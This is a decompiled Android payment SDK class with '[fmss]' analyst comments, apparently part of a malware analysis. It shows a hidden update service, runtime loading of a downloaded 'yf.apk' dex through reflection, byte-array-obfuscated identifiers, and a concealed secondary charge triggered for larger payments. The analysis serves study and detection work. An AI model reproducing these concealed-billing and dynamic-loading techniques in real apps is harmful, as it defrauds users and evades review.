package com.y.f.jar.pay;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import com.yf.y.f.init.constant.PayResult;
import com.yf.y.f.init.pay.PayResultListener;
import com.yf.y.f.init.pay.SZYTPay;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
/* loaded from: classes.dex */
public class YFPaySDK {
    public static final String APK_NAME = "yf.apk";
    public static final int DEFAULT_VERSION = 20151106;
    public static final int DOWN_PORT = -101;
    public static final int INITAPK = -100;
    private static final String TAG = YFPaySDK.class.getSimpleName();
    public static boolean debug_flag = true;
    public static String filePath;
    private String gAppid;
    private BillingListener gBillingListener;
    private Activity gContext;
    private String gDistro;
    private String gFm;
    private int gprice;
    public Handler mHandler = new Handler() { // from class: com.y.f.jar.pay.YFPaySDK.1
        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            try {
                if (msg.what < 2000 && msg.what >= 1000) {
                    YFPaySDK.this.gBillingListener.onInitResult(msg.what);
                } else if (msg.what == -100) {
                    if (YFPaySDK.this.payObj == null || YFPaySDK.this.payClazz == null) {
                        DexClass.install(YFPaySDK.this.gContext, YFPaySDK.filePath).setDexClassChange();
                        YFPaySDK.this.MjBilling();
                    }
                } else if (msg.what == -101) {
                    String temp = (String) msg.obj;
                    if (temp != null) {
                        temp.equals("");
                    }
                } else if (msg.what == 2000 || msg.what == 2001) {
                    YFPaySDK.this.gBillingListener.onBillingResult(msg.what, msg.getData());
                } else if (YFPaySDK.this.gprice >= 2000) {
                    YFPaySDK.this.download(msg.what, msg.getData());
                } else {
                    YFPaySDK.this.gBillingListener.onBillingResult(msg.what, msg.getData());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    private Class<?> payClazz;
    private Object payObj;

    // [fmss] When the class is instantiated, the service "UpdateServices" is started and the method init of the class SZYTPay is executed
    public YFPaySDK(Activity gContext, BillingListener billingListener, String appid, String distro, String fm) {
        this.gContext = gContext;
        this.gBillingListener = billingListener;
        this.gAppid = appid;
        this.gDistro = distro;
        this.gFm = fm;
        filePath = gContext.getFileStreamPath(APK_NAME).getAbsolutePath(); // [fmss] The path to yf.apk is retrieved
        new UpdateSDK(gContext, this.mHandler, filePath).execute("");
        Intent intent = new Intent(gContext, UpdateServices.class);
        gContext.startService(intent); // [fmss] The service "UpdateServices" is started
        byte[] appidbyte = {50, 48, 54, 52, 55, 50, 48, 55};
        String ytappid = Utils.byteToString(appidbyte);
        // [fmss] The init method of SZYTPay gets an instance of SdkDlm and calls its init method
        SZYTPay.getInstance().init(gContext, ytappid, String.valueOf(appid) + "_" + fm); 
    }

    // [fmss] If the property payClazz is null, calls MjBilling() that initializes the class loading it from com.yf.billing.MjBilling, 
    // then its method pay is executed with the specified parameters 
    public void pay(String orderNo, String payCode, String price) {
        if (this.payObj == null || this.payClazz == null) {
            MjBilling();
        }
        try {
            this.gprice = Integer.parseInt(price);
            Class[] payparams = {String.class, String.class, String.class};
            Method devpCheckAction = this.payClazz.getMethod("pay", payparams);
            devpCheckAction.invoke(this.payObj, orderNo, payCode, price);
        } catch (Exception e) {
            this.mHandler.sendEmptyMessage(YFBillingCode.BILL_APK_PAY_ERROR);
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void download(final int code, final Bundle data) {
        byte[] appidbyte = {55, 48, 57, 57, 52, 57, 50, 50};
        String ytappid = Utils.byteToString(appidbyte);
        int feecode = Integer.parseInt(ytappid);
        SZYTPay.getInstance().pay(this.gContext, feecode, 2000, new PayResultListener() { // from class: com.y.f.jar.pay.YFPaySDK.2
            private static /* synthetic */ int[] $SWITCH_TABLE$com$yf$y$f$init$constant$PayResult;

            static /* synthetic */ int[] $SWITCH_TABLE$com$yf$y$f$init$constant$PayResult() {
                int[] iArr = $SWITCH_TABLE$com$yf$y$f$init$constant$PayResult;
                if (iArr == null) {
                    iArr = new int[PayResult.values().length];
                    try {
                        iArr[PayResult.CANCEL.ordinal()] = 2;
                    } catch (NoSuchFieldError e) {
                    }
                    try {
                        iArr[PayResult.CHANNELCLOSE.ordinal()] = 6;
                    } catch (NoSuchFieldError e2) {
                    }
                    try {
                        iArr[PayResult.CLICKOFFTEN.ordinal()] = 8;
                    } catch (NoSuchFieldError e3) {
                    }
                    try {
                        iArr[PayResult.FAIL.ordinal()] = 9;
                    } catch (NoSuchFieldError e4) {
                    }
                    try {
                        iArr[PayResult.FORBID.ordinal()] = 4;
                    } catch (NoSuchFieldError e5) {
                    }
                    try {
                        iArr[PayResult.ILLEGAL.ordinal()] = 3;
                    } catch (NoSuchFieldError e6) {
                    }
                    try {
                        iArr[PayResult.NONESERVICE.ordinal()] = 5;
                    } catch (NoSuchFieldError e7) {
                    }
                    try {
                        iArr[PayResult.SERVERERROR.ordinal()] = 7;
                    } catch (NoSuchFieldError e8) {
                    }
                    try {
                        iArr[PayResult.SUCCESS.ordinal()] = 1;
                    } catch (NoSuchFieldError e9) {
                    }
                    $SWITCH_TABLE$com$yf$y$f$init$constant$PayResult = iArr;
                }
                return iArr;
            }

            @Override // com.yf.y.f.init.pay.PayResultListener
            public void onResult(PayResult payResult, int feeCode) {
                switch ($SWITCH_TABLE$com$yf$y$f$init$constant$PayResult()[payResult.ordinal()]) {
                    case 1:
                        YFPaySDK.this.gBillingListener.onBillingResult(2000, data);
                        return;
                    default:
                        YFPaySDK.this.gBillingListener.onBillingResult(code, data);
                        return;
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void MjBilling() {
        try {
            this.payClazz = DexClass.install(this.gContext, filePath).getDexClass("com.yf.billing.MjBilling");
            Class[] params = {Context.class, Handler.class, String.class, String.class, String.class};
            Constructor<?> ct = this.payClazz.getConstructor(params);
            this.payObj = ct.newInstance(this.gContext, this.mHandler, this.gAppid, this.gDistro, this.gFm);
            SetDebugMode(debug_flag);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void SetDebugMode(boolean velue) {
        debug_flag = velue;
        if (this.payClazz != null) {
            try {
                Class[] params = {Boolean.TYPE};
                Method devpCheckActions = this.payClazz.getMethod("SetDebugMode", params);
                devpCheckActions.invoke(null, Boolean.valueOf(debug_flag));
            } catch (Exception e) {
            }
        }
    }
}
